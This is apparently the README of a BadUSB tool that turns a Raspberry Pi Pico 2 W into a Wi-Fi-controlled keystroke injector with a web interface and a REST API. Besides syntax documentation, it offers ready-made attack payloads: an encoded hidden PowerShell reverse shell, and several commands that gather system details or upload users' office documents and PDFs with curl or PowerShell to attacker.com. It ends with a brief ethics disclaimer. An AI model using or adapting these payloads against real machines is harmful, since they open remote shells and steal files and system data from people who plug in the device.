# KEYOES BadUSB Controller


A sophisticated BadUSB implementation leveraging the Raspberry Pi Pico 2 W microcontroller, offering remote execution capabilities through an intuitive web interface inspired by the Kali Linux terminal aesthetic.

## Overview

KEYOES BadUSB Controller transforms your Raspberry Pi Pico 2 W into a versatile Human Interface Device (HID) that can be remotely controlled over Wi-Fi. This project implements a complete attack framework for security testing and administrative task automation, featuring real-time monitoring, payload management, and comprehensive API access.

## Features

- **Advanced HID Emulation**: Full keyboard emulation with support for complex key combinations and timing precision
- **Web-based Control Interface**: Terminal-like environment for creating, editing, and executing HID attacks
- **Command Syntax**: Compatible with Ducky Script syntax with extended capabilities
- **Payload History**: Track and reuse previously executed attacks
- **RESTful API**: Programmatic access for integration with other security tools and frameworks
- **Real-time Status Monitoring**: Wi-Fi connection status and execution feedback
- **Visual Feedback**: LED indicators for system status and operation confirmation

## Usage Guide

### Web Interface Navigation

After deployment and connection, access the web interface by navigating to the device's IP address. The interface consists of two primary tabs:

1. **Terminal Tab**: For creating and executing BadUSB payloads
2. **Payloads Log Tab**: For reviewing previously executed payloads

#### Terminal Tab Controls

- **Script Editor**: Central textarea for entering Ducky Script commands
- **Upload Button**: Sends the current script to the device's memory
- **Execute Button**: Runs the currently loaded script
- **Clear Button**: Erases the script editor content
- **Command History**: Shows recently executed commands and their status

#### Keyboard Shortcuts

- `Ctrl+T`: Switch to Terminal tab
- `Ctrl+P`: Switch to Payloads Log tab

### Command Syntax Reference

KEYOES BadUSB Controller supports an extended version of the Ducky Script language with additional timing controls:

```
REM This is a comment
DELAY 1000             // Wait for 1000ms
STRING echo "Hello"    // Type the text literally
ENTER                  // Press the Enter key
CTRL ALT DELETE        // Press key combination (space-separated)
CTRL+ALT+T             // Alternative combination syntax
CHAR_DELAY 50          // Set delay between keystrokes to 50ms
```

#### Core Commands

| Command      | Description                                 |  Example               |
|--------------|---------------------------------------------|------------------------|
| `STRING`     | Types the specified text                    | `STRING Hello, world!` |
| `DELAY`      | Pauses execution for specified milliseconds | `DELAY 500`            |
| `CHAR_DELAY` | Sets typing speed (ms between characters)   | `CHAR_DELAY 25`        |
| `REM`        | Comment (ignored during execution)          | `REM Opening terminal` |

#### Special Keys

The controller supports all standard keyboard keys, including:

- Modifiers: `CTRL`, `SHIFT`, `ALT`, `GUI` (Windows key)
- Function keys: `F1` through `F12`
- Navigation: `UP`, `DOWN`, `LEFT`, `RIGHT`, `HOME`, `END`, `PAGEUP`, `PAGEDOWN`
- System keys: `ESC`, `TAB`, `CAPSLOCK`, `PRINTSCREEN`, `DELETE`, etc.

### Payload Development Best Practices

#### Timing Optimization

Fine-tune your attack payloads with strategic timing:

```
CHAR_DELAY 20    // Fast typing for simple text
STRING cd /tmp && mkdir test
ENTER
DELAY 500        // Allow system time to process command
CHAR_DELAY 50    // Slower typing for complex passwords or commands
STRING sudo ./execute_critical_operation.sh
ENTER
```

#### Target-Specific Adaptations

Adjust your payloads based on the target operating system:

- **Windows**: Use `GUI+r` to open Run dialog, then execute commands
- **macOS**: Use `GUI+SPACE` to open Spotlight, then launch applications
- **Linux**: Use `CTRL+ALT+T` to open terminal on many distributions

#### Multi-phase Payloads

Implement sophisticated attacks through payload sequencing:

```
REM Phase 1: Reconnaissance
GUI+r
DELAY 200
STRING cmd
ENTER
DELAY 500
STRING systeminfo > %TEMP%\sysinfo.txt
ENTER

REM Phase 2: Exfiltration
DELAY 1000
STRING powershell -W Hidden -c "Invoke-WebRequest -Uri 'http://attacker.com/upload' -Method POST -InFile $env:TEMP\sysinfo.txt"
ENTER
```

### API Integration

Access the controller programmatically through the RESTful API:

#### Execute Payload via API

```python
import requests

payload = """
DELAY 1000
CTRL+ALT+T
DELAY 500
STRING echo "API Execution Test"
ENTER
"""

# Direct script execution
response = requests.post("http://[DEVICE_IP]/api/badusb", data=payload)
print(response.text)

# JSON-based command
command = {
    "action": "upload",
    "script": payload
}
response = requests.post("http://[DEVICE_IP]/api/badusb", json=command)
print(response.json())
```

#### API Endpoints (NOT TESTED YET )

| Endpoint       | Method     | Description                      |
|----------------|------------|----------------------------------|
| `/api/badusb`  | POST       | Upload and/or execute scripts    |
| `/wifi-status` | GET        | Check device connectivity status |

## Advanced Usage Scenarios

### Red Team Operations

- **Initial Access**: Deploy payloads that establish persistence on target systems
- **Lateral Movement**: Execute commands that enable access to other networked systems
- **Data Exfiltration**: Automate the collection and transmission of sensitive information

### System Administration

- **Automated Configuration**: Deploy standardized configurations across multiple systems
- **Scheduled Maintenance**: Execute routine maintenance tasks requiring privileged access
- **Software Deployment**: Automate software installation processes across workstations

### Security Testing

- **Phishing Simulation**: Demonstrate the dangers of connecting unknown USB devices
- **Policy Compliance**: Test enforcement of security policies regarding USB devices
- **Incident Response Training**: Create realistic scenarios for security team exercises

## Sample Attack Scenarios

### Windows PowerShell Reverse Shell

```
REM Windows PowerShell Reverse Shell
DELAY 1000
GUI+r
DELAY 500
STRING powershell -W Hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADMAKQANAAoAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApAA0ACgAkAHcAcgBpAHQAZQByACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFcAcgBpAHQAZQByACgAJABzAHQAcgBlAGEAbQApAA0ACgAkAGIAdQBmAGYAZQByACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEIAeQB0AGUAWwBdACAAMQAwADIANAA7ACQAZQBuAGMAbwBkAGkAbgBnACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnAA0ACgAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAB7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABlAG4AYwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYQByAGcAcwApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACsAPQAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHcAcgBpAHQAZQByAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAYQBjAGsAMgApAH0ADQAKAHcAaABpAGwAZQAoACQAdAByAHUAZQApAHsAJABiAHkAdABlAHMAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAdQBmAGYAZQByACwAMAAsACQAYgB1AGYAZgBlAHIALgBMAGUAbgBnAHQAaAApADsAJABjAG8AbQBtAGEAbgBkACAAPQAgACQAZQBuAGMAbwBkAGkAbgBnAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAdQBmAGYAZQByACwAMAAsACQAYgB5AHQAZQBzACkAOwBpAGYAKAAkAGMAbwBtAG0AYQBuAGQALgBsAGUAbgBnAHQAaAAgAC0AZwB0ACAAMAApAHsAdAByAHkAewAkAG8AdQB0AHAAdQB0ACAAPQAgAGkAZQB4ACAAJABjAG8AbQBtAGEAbgBkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnADsAJABzAGUAbgBkAGIAYQBjAGsALgBJAG4AdgBvAGsAZQAoACQAbwB1AHQAcAB1AHQAKQBAAC4AfQBAdAByAHkAewAkAHMAZQBuAGQAYgBhAGMAawAuAEkAbgB2AG8AawBlACgAJABlAHIAcgBvAHIAWwAwAF0AQAAKAG0AZQBzAHMAYQBnAGUAKQB9AH0AfQA=
ENTER
```

### Linux Data Exfiltration

```
REM Linux Data Exfiltration
DELAY 1000
CTRL+ALT+T
DELAY 500
STRING find /home -name "*.xlsx" -o -name "*.docx" -o -name "*.pdf" | while read file; do curl -F "file=@$file" http://attacker.com/upload; done
ENTER
```

### Cross-platform Reconnaissance

```
REM Cross-platform System Info Gatherer
DELAY 1000
GUI+r
DELAY 500
STRING cmd /c "systeminfo > %TEMP%\sysinfo.txt & ipconfig /all >> %TEMP%\sysinfo.txt & net user >> %TEMP%\sysinfo.txt & type %TEMP%\sysinfo.txt | curl -X POST -d @- http://attacker.com/collect"
ENTER
```

## Best Practices for Operational Security

When utilizing this controller for legitimate security testing:

1. **Explicit Authorization**: Always obtain written permission before testing any systems
2. **Scope Definition**: Clearly define testing boundaries and expected outcomes
3. **Evidence Preservation**: Document all testing activities for compliance purposes
4. **Controlled Environment**: Initially test payloads in isolated environments
5. **Data Handling**: Follow proper procedures for any data collected during testing

## Ethics Statement

KEYOES BadUSB Controller is designed for legitimate security testing, system administration, and educational purposes only. Users bear full responsibility for ensuring their usage complies with applicable laws, regulations, and organizational policies.

---

*Note: This README is provided for educational purposes. The capabilities described herein should only be employed in authorized contexts with appropriate safeguards.*
